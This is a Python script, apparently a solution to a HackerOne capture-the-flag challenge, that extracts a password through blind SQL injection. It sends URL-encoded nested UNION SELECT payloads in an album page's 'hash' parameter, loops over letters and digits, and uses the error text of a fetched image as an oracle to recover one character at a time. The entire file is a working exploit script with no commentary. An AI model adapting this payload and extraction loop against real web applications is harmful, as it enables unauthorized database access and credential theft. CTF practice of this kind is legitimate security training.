#!/usr/bin/python3

import requests
from urllib.request import urlopen
from bs4 import BeautifulSoup
import string
import numpy as np

alphabet = list(string.ascii_lowercase)
number = list(range(0,10))
fuzz = np.concatenate((alphabet,number))

username = ""

while len(username) < 10:

	for i in fuzz:

		i = username + i

		payload = "lol%20%27%20UNION%20SELECT%20%221%27%20union%20select%20\%221\%22,\%222\%22,\%22../api/user?password={}%\%22--+-%22,%222%22,%223%22--+-".format(i)
		
		url = "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash={}".format(payload)
		
		req = urlopen(url)

		bs = BeautifulSoup(req.read(), 'html.parser')

		response = bs.find_all('img',class_='img-responsive')

		img_data = response[2]

		sec_req =requests.get("https://hackyholidays.h1ctf.com"+img_data['src'])

		response_txt = sec_req.text

		if "Invalid content type detected" not in response_txt:

			continue
		
		else:
			
			username = username + i[-1]

			print("Found valid character: "+i)

			break
else:

	print("Here's the final password: "+username)